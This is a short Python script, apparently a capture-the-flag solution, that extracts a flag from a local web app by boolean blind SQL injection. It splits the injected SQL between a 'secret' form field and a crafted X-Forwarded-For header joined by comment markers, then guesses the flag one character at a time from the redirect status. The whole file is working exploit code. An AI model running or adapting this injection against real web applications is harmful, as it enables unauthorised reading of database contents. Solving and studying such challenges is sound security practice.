import os
import string

import requests

URL = os.getenv("URL", "http://localhost:3000/").rstrip("/")

session = requests.Session()

chars = "_}" + string.ascii_letters + string.digits

known = "Alpaca{"

while known[-1] != "}":
    for c in chars:
        response = session.post(f"{URL}/set", data={
            "secret": f"*/,(SELECT 1 FROM flag WHERE unicode(substr(flag,{len(known)+1},1))={ord(c)}))--"
        }, headers={
            "X-Forwarded-For": "'/*"
        }, allow_redirects=False)
        if response.status_code == 302:
            known += c
            print(known)
            break